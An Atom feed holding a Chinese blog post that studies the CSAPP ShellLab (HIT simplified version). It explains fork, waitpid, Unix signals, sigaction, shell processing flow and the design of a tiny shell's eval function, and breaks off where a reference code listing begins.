<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zinker&#39;s hikari</title>
  
  <subtitle>一人である</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-10T15:03:50.715Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Zinker</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSAPP: ShellLab 哈工大简化版</title>
    <link href="http://yoursite.com/CSAPP-ShellLab-%E5%93%88%E5%B7%A5%E5%A4%A7%E7%AE%80%E5%8C%96%E7%89%88/"/>
    <id>http://yoursite.com/CSAPP-ShellLab-哈工大简化版/</id>
    <published>2018-12-02T17:21:34.000Z</published>
    <updated>2018-12-10T15:03:50.715Z</updated>
    
    <content type="html"><![CDATA[<p>首先说一下，哈工大的特色就是规格严格功夫到家。然而收作业的时候，因为所谓的规格严格，在同时出现了两个规格的情况下，我们便不知道应该怎么做了，所以我希望无论什么时候都不要有两个不同的规格。</p><p>闲话说完，开始准备看实验了。</p><p>这个实验是CSAPP的ShellLab的简化版，也就是说ShellLab中的eval和do_bgfg两个函数不需要我们写，但是我嗯的实验报告上却让我们写代码的完成思路，呵呵，果然规格严格。</p><a id="more"></a><p>那么我们首先来列一下目录，也就是说，我们做这个实验需要什么样的一个阶段：</p><h1 id="实验基础知识准备及复习"><a href="#实验基础知识准备及复习" class="headerlink" title="实验基础知识准备及复习"></a>实验基础知识准备及复习</h1><p>​    那么，我们首先，最重要的、重中之重的就是我们的实验知识的准备阶段了。由于这个实验在书中所讲的内容很重要，同时这个实验又涉及到很多只有在CMU或者是HIT上课的PPT上才有的内容，所以我尽可能的将其中的知识点打包好来整理一下所有的知识点。大致的思路是：以书本为主，CMU的PPT为辅，HIT的PPT等到其他实在看不懂的时候再来查。</p><p>​    那么，我在此先附一下链接，在文章末尾还会写的。</p><p>1.CSAPP课本：《深入理解计算机系统》：第8章：异常控制流</p><p>2.CMU：<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec09.pdf" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec09.pdf</a>   异常控制流</p><p><a href="http://csapp.cs.cmu.edu/3e/shlab.pdf" target="_blank" rel="noopener">http://csapp.cs.cmu.edu/3e/shlab.pdf</a> shellLab的pdf提示过程</p><p>3.HIT：<a href="https://pan.baidu.com/s/1nLvhg6eeCtUYUCq5AwrqIw" target="_blank" rel="noopener">https://pan.baidu.com/s/1nLvhg6eeCtUYUCq5AwrqIw</a> 实验包和这章的ppt</p><p>​    好的，那么我们的实验基础阶段就要开始了。开始之前，无论你是否有过基础，你是否有过类似的想法，请你无论如何要将CSAPP的异常控制流这章节的内容看一遍。无论如何要将CSAPP的异常控制流这章节的内容看一遍。无论如何要将CSAPP的异常控制流这章节的内容看一遍。好，现在你看完三遍了对吧，如果你看完三遍的话，那么可能理解下面的内容会比较容易接受。</p><p>##进程的概念、创建和回收方法</p><p>​    进程是这个实验中最重要的概念，可以说如果弄不明白进程的含义和利用进程的方法，就不可能做明白这个实验。所以我们首先要对进程是什么、怎么用要有一定了解。</p><h3 id="进程的概念"><a href="#进程的概念" class="headerlink" title="进程的概念"></a>进程的概念</h3><p>​    进程的经典定义是一个执行中的程序的实例。系统中的每个程序都运行在某个进程的上下文中。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的代码和数据，它的栈、通用目的寄存器中的内容、程序计数器、环境变量和打开文件描述符的集合。</p><p>​    进程，是计算机中已运行程序的实体。进程为曾经是分时系统的基本运作单位。在面向进程设计的系统（如早期的UNIX，Linux2.4及更早的版本）中，进程是程序的基本执行实体；在面向线程设计的系统（如当代多数操作系统、Linux 2.6及更新的版本）中，进程本身不是基本运行单位，而是线程的容器。程序本身只是指令、数据及其组织形式的描述，进程才是程序（那些指令和数据）的真正运行实例。</p><p>​    我们在这个实验中需要理解进程的概念，因为我们要实现的函数中有关于前台进程和后台进程的概念，也就是do_bgfg这个函数。</p><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><p>​    系统只有一种方法来创建新的进程，就是使用fork()函数，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">//返回：子进程返回0，父进程返回子进程的pid，如果出错则返回-1；</span></span><br></pre></td></tr></table></figure><p>​    新创建的子进程不完全和父进程相同，他们区别在于他们的pid不相同。fork()函数只被调用一次，但是返回两次。一次在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中，fork()返回子进程的PID。在子进程中，fork()返回0。因为子进程的PID总是非零。返回值就提供了一个明确的方法来分辨程序是在父进程还是子进程中执行。可以通过一下的代码来理解这一过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;  <span class="comment">/* only child process */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"child: x=%d\n"</span>, ++x);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* only parent process */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"parent: x=%d\n"</span>, --x);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//fork.c</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc fork.c &amp;&amp; ./a.out</span><br><span class="line">parent:x=<span class="number">0</span></span><br><span class="line">child: x=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>​    当fork()执行的时候，子进程被创建，但是放在了进程队列的后边，所以首先进行的是父进程，所以先运行的是父进程的代码，也就是输出parent的部分，当父进程返回后，子进程继续运行，就按照子进程运行，那么此时输出的就是child的部分。</p><p>​    如果想在子进程中运行其它的东西，可以使用execve()函数。execve()函数在当前进程中执行命令，拥有当前进程的全部上下文。在这里不做过多叙述。</p><h3 id="进程的回收"><a href="#进程的回收" class="headerlink" title="进程的回收"></a>进程的回收</h3><p>​    当进程由于某种原因终止时，内核并不是立即把它从系统中清除，而是使得该进程保持在一种已经终止的状态中，直到被它的父进程回收。当父进程回收已经终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃已终止的进程。一个已经终止了但是还未被回收的进程称为僵死进程。</p><p>​    一个进程可以通过调用waitpid函数来等待它的子进程终止或者停止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sts/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statusp, <span class="keyword">int</span> options);</span><br><span class="line"><span class="comment">//返回：如果成功，则返回子进程的PID，如果WNOHANG，则为0，如果其他错误，则为-1。</span></span><br></pre></td></tr></table></figure><p>​    其中对于waitpid的函数的深入解释，以及各个参数的功能和含义请参照CSAPP教材。</p><h2 id="信号的机制、种类"><a href="#信号的机制、种类" class="headerlink" title="信号的机制、种类"></a>信号的机制、种类</h2><p>​    Linux信号是一种高层的软件形式的异常，它允许进程和内核中断其他进程。一个信号就是一个小消息，他通知进程系统中发生了一个某种类型的事件。每种信号类型都对应着某种系统事件，底层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程都是不可见的。信号提供了一种机制，通知用户进程发生了这些异常。<img src="/CSAPP-ShellLab-哈工大简化版/1.png" alt="1"></p><p>​    一个信号被发出之后，目标程序对信号做出了相应，我们称它为接收了那个信号。如果一个信号被发出但是并未被接受，那么这个信号就进入了等待状态。同类型的信号最多只会有一个待处理信号，后续所有的同类型信号都会被简单地丢弃。程序将在内核进行上下文切换的时候切换到它时检查待处理信号序列，并且挑出一个信号进行处理。内核使用等待位向量和阻塞位向量来维护信号。信号以进程组为单位发生作用，一个进程组是由多个进程组成的，进程组在操作系统中也被称为作业（job）。比如，发送一个SIGKILL信号给某个进程组，那么那个进程组中的所有进程都会被终止。每一个信号类型都有一个默认的处理动作，也可以自己指定函数作为进程收到信号的处理，这样的函数叫信号处理函数。</p><h2 id="信号的发送方法、阻塞方法、处理程序的设置方法"><a href="#信号的发送方法、阻塞方法、处理程序的设置方法" class="headerlink" title="信号的发送方法、阻塞方法、处理程序的设置方法"></a>信号的发送方法、阻塞方法、处理程序的设置方法</h2><h3 id="信号的发送"><a href="#信号的发送" class="headerlink" title="信号的发送"></a>信号的发送</h3><p>​    内核通过更新目的进程的上下文中的某个状态，发送（递送）一个信号给目的进程。发送信号可以有如下两个原因：1）内核检测到了一个系统事件，比如除零错误或者子进程终止。2）一个进程调用了kill函数，显示地要求内核发送一个信号给目的进程。一个进程可以给自己发送信号。</p><p>​     A：Unix系统提供了大量向进程发送信号的机制。所有这些机制都是基于进程组的概念的。</p><p>​    每一个进程都只属于一个进程组，进程组是有一个正整数进程组ID来表示的。getpgrp函数返回当前进程的进程组ID：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpgrp(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">//返回：调用进程的进程组ID</span></span><br></pre></td></tr></table></figure><p>​    默认地，一个子进程和它的父进程同属于一个进程组。一个进程可以通过使用setpgid函数来改变自己或者其他进程的进程组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setpgid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">pid_t</span> pgid)</span></span>;</span><br><span class="line"><span class="comment">//返回：若成功则为0，若错误则为-1</span></span><br></pre></td></tr></table></figure><p>​    setpgid函数将进程pid的进程组改为pgid。如果pid是0，那么就使用当前进程的PID。如果pgid是0，那么就用pid指定的进程的PID作为进程组的ID。    </p><p>​    B：用/bin/kill 程序发送信号</p><p>​    可以使用如下的命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux&gt; /bin/kill -<span class="number">9</span> <span class="number">15213</span></span><br></pre></td></tr></table></figure><p>​    该命令的含义是将信号9发送给进程15213.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux&gt; /bin/kill -<span class="number">9</span> -<span class="number">15213</span></span><br></pre></td></tr></table></figure><p>​    该命令的含义是将信号9发送给进程组ID为15213的所有进程中。</p><p>​    C：从键盘发送信号</p><p>​    Unix shell使用作业这个抽象概念来表示为对一条命令行求值而创建的进程。在任何时刻之多只有一个前台作业和0个或多个后台作业。</p><p>​    在键盘上输入Ctrl+C会导致内核发送一个SIGINT信号到前台进程组的每个进程。默认情况下，结果是终止前台作业。类似地，输入Ctrl+Z会发送一个SIGTSTP信号到前台进程组的每个进程。默认情况下，结果是停止（挂起）前台作业。</p><p>​    D：用kill函数发送信号：</p><p>​    进程通过调用kill函数发送信号给其他进程（包括他们自己）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="comment">//返回：若成功则为0， 若错误则为-1。</span></span><br></pre></td></tr></table></figure><p>​    如果pid大于0，那么kill函数发送信号号码sig给进程pid。如果pid等于0，那么kill发送信号sig给调用进程所在进程组中的每个进程，包括调用进程自己，如果pid小于0，那么kill发送信号sig给进程组|pid|中的每一个进程。</p><p>​    E：用alarm函数发送信号：</p><p>​    进程可以通过调用alarm函数向它自己发送SIGALRM信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br><span class="line"><span class="comment">//返回：前一次闹钟剩余的秒数，如果以前没有设定闹钟，则返回0.</span></span><br></pre></td></tr></table></figure><p>​    alarm函数安排内核在sec秒后发送一个SIGALRM信号给调用进程。如果secs是零，那么不会调度安排新的闹钟，在任何情况下，对alarm的调用都将取消任何待处理的（pending闹钟），并且返回任何待处理的闹钟在被发送前还剩下的秒数（如果这次对alarm的调用没有取消它的话）；如果没有任何待处理的闹钟，就返回零。</p><h3 id="信号的阻塞"><a href="#信号的阻塞" class="headerlink" title="信号的阻塞"></a>信号的阻塞</h3><p>​    Linux提供阻塞信号的隐式和显式的机制：</p><p>​    隐式阻塞机制：内核默认阻塞任何当前处理程序正在处理类型的待处理的信号。</p><p>​    显示阻塞机制：应用程序可以使用sigprocmask函数和它的辅助函数，明确地阻塞和接触阻塞选定的信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how, <span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">sigset_t</span> *oldest)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigemptyset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigfullset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaddset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigdelset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="comment">//返回：如果成功就返回0，若出错就返回-1；</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigismember</span><span class="params">(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="comment">//返回：若signum是set的成员则为1，如果不是则为0，若出错则为-1；</span></span><br></pre></td></tr></table></figure><p>​    sigprocmask函数改变当前阻塞的信号集合。具体的行为依赖于how的值：</p><p>​    SIG_BLOCK：把set中的信号添加到blocked中（blocked=blocked|set）。</p><p>​    SIG_UNBLOCK：从blocked中删除set中的信号（blocked=blocked&amp;～set）。</p><p>​    SIG_SETMASK：block = set。</p><p>​    如果oldest非空，那么blocked位向量之前的值保存在oldest中。</p><p>​    使用下列函数对set信号集合进行操作：sigemptyset初始化set为空集合，sigfillset函数把每个信号都添加到set中，sigaddset函数把signum添加到set，sigdelset函数从set中删除signum，如果signum是set的成员，那么sigismember返回1，否则返回0。  </p><h3 id="信号的处理程序"><a href="#信号的处理程序" class="headerlink" title="信号的处理程序"></a>信号的处理程序</h3><h4 id="安全的信号处理："><a href="#安全的信号处理：" class="headerlink" title="安全的信号处理："></a>安全的信号处理：</h4><p>​    G0：处理程序要尽可能简单</p><p>​    G1：在处理程序中只调用异步信号安全的函数    </p><p><img src="/CSAPP-ShellLab-哈工大简化版/2.png" alt="2"></p><p>​    所谓异步信号安全的函数能够被信号处理程序安全地调用，原因有二：要么它是可重入的，要么它不能被信号处理程序中断。但是在本实验中，由于我们学校给出部分的代码中已经利用了一些不属于以上部分的函数，所以我们在这个实验中可以使用一些非异步信号安全的函数。</p><p>​    G2：保存和恢复errno。许多Linux异步信号安全的函数都会在出错返回时设置errno。在处理程序中调用这样的函数可能会干扰主程序中其他依赖于errno的部分。解决方法是在进入处理程序时把errno保存在一个局部变量中，在处理程序返回前恢复它。注意，只有在处理程序要返回时才有必要。如果处理程序调用_exit终止该进程，那么久不需要这样做了。</p><p>​    G3：阻塞所有的信号，保护对共享全局数据结构的访问。如果处理程序和主程序或其他处理程序共享一个全局数据结构，那么在访问该数据结构时，你的处理程序和主程序应该暂时阻塞所有的信号。在这个实验中，有的时候可以忽略掉这一点，因为如果需要阻塞所有信号，就会导致一部分的shell程序无法进行。</p><p>​    G4：用volatile去声明全局变量。volatile限定符的目的是告诉编译器不要缓存这个变量，例如 volatile int g；这条语句中，volatile限定符强迫编译器每次在代码中引用g时，都要从内存中读取g的值，也是为了保护每次对全局变量的访问。</p><p>​    G5：用sig_atomic_t声明标志。在常见的处理程序设计中，处理程序会写全局标志来记录收到了信号。主程序周期性地读这个标志，响应信号，再清除该标志。对于通过这种方式来共享的标志，C语言提供一种整型数据类型sig_atomic_t，对它的读和写会保证是不可中断的。</p><h4 id="正确的信号处理："><a href="#正确的信号处理：" class="headerlink" title="正确的信号处理："></a>正确的信号处理：</h4><p>​    未经过处理的信号是不排队的，每种类型最多只能有一个未处理的信号，因此如果有两个相同类型的信号发送给一个目的进程，就会有一个信号被丢弃。所以在处理时，我们不应该同时输出两个相同类型的信号。而是先阻塞所有信号后，再进行当前信号的处理。</p><h4 id="可移植的信号处理："><a href="#可移植的信号处理：" class="headerlink" title="可移植的信号处理："></a>可移植的信号处理：</h4><p>​    Unix信号处理的另一个缺陷在于不同的系统有不同的信号处理语义。例如：</p><p>A. Signal函数的语义各有不同</p><p>B. 系统调用可以被中断。像read、write和accept这样的系统调用潜在地会阻塞进程一段较长的时间，称为慢速系统调用。</p><p>​    要解决这些问题我们需要使用sigaction函数，它允许用户在设置信号处理时，明确指定他们想要的信号处理语义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaction</span><span class="params">(<span class="keyword">int</span> signum, struct sigaction *act, struct sigaction *oldact)</span></span>;</span><br><span class="line"><span class="comment">//返回： 若成功则为0，若出错则为-1</span></span><br></pre></td></tr></table></figure><p>​    一个更简洁的方式时定义一个Signal函数，它是一个包装函数，这个函数调用了sigaction。</p><p><img src="/CSAPP-ShellLab-哈工大简化版/3.png" alt="3"></p><p>​    Signal包装函数设置了一个信号处理程序，其信号处理语义如下：</p><ul><li>只有这个处理程序当前正在处理的那种类型的信号被阻塞。</li><li>和所有信号实现一样，信号不会排队等待。</li><li>只要可能，被中断的系统调用会自动重启。</li><li>一旦设置了信号处理程序，它就会一直保持，知道Signal带着handler函数为SIG_IGN或者SIG_DFL被调用。    </li></ul><h2 id="Shell的概念，功能和处理流程"><a href="#Shell的概念，功能和处理流程" class="headerlink" title="Shell的概念，功能和处理流程"></a>Shell的概念，功能和处理流程</h2><p>​    Linux系统的shell作为操作系统的外壳，为用户提供使用操作系统的接口。它是命令语言、命令解释程序及程序设计语言的统称。shell是用户和Linux内核之间的接口程序，如果把Linux内核想象成一个球体的中心，shell就是围绕内核的外层。当从shell或其他程序向Linux传递命令时，内核会做出相应的反应。shell是一个命令语言解释器，它拥有自己内建的shell命令集，shell也能被系统中其他应用程序所调用。用户在提示符下输入的命令都由shell先解释然后传给Linux核心。有一些命令，比如改变工作目录命令cd，是包含在shell内部的。还有一些命令，例如拷贝命令cp和移动命令mv，是存在于文件系统中某个目录下的单独的程序。对用户而言，不必关心一个命令是建立在shell内部还是一个单独的程序。shell首先检查命令是否是内部命令，若不是再检查是否是一个应用程序（这里的应用程序可以是Linux本身的实用程序，如ls和rm，也可以是购买的商业程序，如xv，或者是自由软件，如emacs）。然后shell在搜索路径里寻找这些应用程序（搜索路径就是一个能找到可执行程序的目录列表）。如果键入的命令不是一个内部命令并且在路径里没有找到这个可执行文件，将会显示一条错误信息。如果能够成功找到命令，该内部命令或应用程序将被分解为系统调用并传给Linux内核。shell的另一个重要特性是它自身就是一个解释型的程序设计语言，shell程序设计语言支持绝大多数在高级语言中能见到的程序元素，如函数、变量、数组和程序控制结构。shell编程语言简单易学，任何在提示符中能键入的命令都能放到一个可执行的shell程序中。当普通用户成功登录，系统将执行一个称为shell的程序。正是shell进程提供了命令行提示符。作为默认值（TurboLinux系统默认的shell是BASH），对普通用户用“$”作提示符，对超级用户（root）用“#”作提示符。一旦出现了shell提示符，就可以键入命令名称及命令所需要的参数。shell将执行这些命令。如果一条命令花费了很长的时间来运行，或者在屏幕上产生了大量的输出，可以从键盘上按ctrl+c发出中断信号来中断它（在正常结束之前，中止它的执行）。当用户准备结束登录对话进程时，可以键入logout命令、exit命令或文件结束符（EOF）（按ctrl+d实现），结束登录。</p><p>​    Shell的处理流程：</p><p>​    (1).读取输入的命令行。</p><p>​    (2).解析引用并分割命令行为各个单词，各单词称为token。其中重定向所在的token会被保存下来，直到扩展步骤(5)结束后才进行相关处理，如进行扩展、截断文件等。</p><p>​    (3).检查命令行结构。主要检查是否有命令列表、是否有shell编程结构的命令，如if判断命令、循环结构的for/while/select/until，这些命令属于保留关键字，需要特殊处理。</p><p>​        (4).对第一个token进行别名扩展。如果检查出它是别名，则扩展后回到(2)再次进行token分解过程。如果检查出它是函数，则执行函数体中的复合命令。如果它既是别名，又是函数(即命令别名和函数同名称的情况)，则优先执行别名。在概念上，别名的临时性最强，优先级最高。</p><p>​        (5).进行各种扩展。扩展顺序为：大括号扩展；波浪号扩展；参数、变量和命令替换、算术扩展(如果系统支持，此步还进行进程替换)；单词拆分；文件名扩展。</p><p>​    (6).引号去除。经过上面的过程，该扩展的都扩展了，不需要的引号在此步就可以去掉了。</p><p>​    (7).搜索和执行命令。</p><p>​    (8).返回退出状态码。</p><h1 id="实验包内容分析"><a href="#实验包内容分析" class="headerlink" title="实验包内容分析"></a>实验包内容分析</h1><ul><li><p>数据包中包含下面文件：</p></li><li><ul><li>tsh.c ： tiny-shell 的代码框架，要求实现里面的空函数</li><li>tshref：参考答案的程序（可执行文件），用于对比程序行为，验证实验代码tsh.c的正确性:</li></ul></li></ul><p>​    tiny-shell的输出应该与tshref的输出完全一致</p><ul><li><ul><li><p>16个轨迹文件(trace file)：trace01.txt  …..  trace16.txt</p></li><li><p>sdriver.pl：shell驱动程序，以子进程的方式运行shell，并根据轨迹文件向shell发送命令和信号。</p></li><li><p>获得帮助：unix&gt; ./sdriver.pl -h</p></li></ul></li><li><p>用shell驱动程序sdriver.pl和追踪文件(trace file)测</p></li><li><p>测试你的shell程序tsh</p><p>unix&gt; ./sdriver.pl -t trace01.txt -s ./tsh -a “-p”</p><p>​               参数<em>-a “-p”</em> 告诉<em>shell</em>不发送命令提示符</p><p>或：</p><p> unix&gt; <em>make test01</em></p></li><li><p>测试参考shell程序tshref</p><p>unix&gt; ./sdriver.pl -t trace01.txt -s ./tshref -a “-p”</p><p>或：</p><p>unix&gt; make rtest01</p></li><li><p>tshref.out已经给出了参考shell程序在所有trace file上的输出，方便查阅。</p></li><li>使用trace file进行测试，除了有文件头注释段落信息外，其余均与手工交互测试的输出结果相同。</li><li>建议：从trace01.txt开始验证，没有问题后，在依次验证trace02.txt， trace03.txt…</li></ul><h1 id="TinyShell的设计和实现"><a href="#TinyShell的设计和实现" class="headerlink" title="TinyShell的设计和实现"></a>TinyShell的设计和实现</h1><h2 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval 函数"></a>eval 函数</h2><h3 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h3><p>​    eval函数的功能是根据使用者从命令行中输入的命令来进行操作。如果使用者已经请求了一个我们建立好的命令（比如说我们之后体现出的：quit，jobs，bg或者fg），那么我们就要立刻去执行它。否则的话，我们就要调用fork（）函数去申请一个子进程，并在子进程中去执行这个工作。如果这个工作是在前台工作的话，那么我们就等待它知道它结束并返回。</p><p>​    注意：每一个子进程都会有一个特有的进程组ID，以便于当我们从键盘键入ctrl+z或者ctrl+c的时候，后台子进程不会从内核接收到SIGINT(SIGTSTP)信号。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>​    eval函数的参数只有char* cmdline，这个参数是我们从键盘键入到命令行界面的命令。</p><h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><p>​    在cmdline不为空的前提下，先通过parseline函数对我们键入的命令进行分析，从而判断是前台进程还是后台进程。然后根据我们的命令进行判断，根据我们所输入的命令执行相关函数。之后有一点令人难以理解的东西，我们首先要阻塞SIGCHLD、SIGINT、SIGTSTP这些信号直到我们要在工作表中增加工作。这些代码可以减少一些发生在向工作表中插入工作的时候同时有这些信号到达所造成的险象。然后申请一个子进程，在子进程中，我们执行以下的操作：首先我们先将之前阻塞的信号解除阻塞，然后我们给这个新的工作申请一个新的组进程ID，因为如果不对组进程ID进行修改，可能会造成内核对所有的Shell的工作发送ctrl+z或者ctrl+c的信号。做完以上工作之后，就可以使子进程的工作开始执行了。我们回到父进程，在父进程中将我们所需要执行的命令根据我们之前的判断将其放在前台或后台工作列表中。然后再将阻塞的信号恢复为非阻塞状态。之后判断使前台进程还是后台进程，如果是前台进程，那么就等待所有前台进程结束。如果是后台进程，那么就输出进程的pid、组id以及进程名称。</p><h3 id="要点分析"><a href="#要点分析" class="headerlink" title="要点分析"></a>要点分析</h3><p>​    1.判断是否为内部函数，如果是内部函数，直接执行built_cmd函数就行。如果不是内部函数，需要Fork出一个新的进程去执行相应的函数。 </p><p>​    2.函数框架提供了parseline命令行解析工具，即可以通过该解析函数来得到命令行参数。如果不是内部函数，首先要先将SIGCHLD信号阻塞住，以防出现竞争条件。 </p><p>​    3.子进程解决信号阻塞，并执行相关函数。 </p><p>​    4.父进程要判断子进程是前台进程还是后台进程，如果是前台进程，则调用waitpid来等待前台进程，如果是后台进程，则打印出相关进程信息。同时，把新添加的进程利用addjob添加到工作组中。</p><h3 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 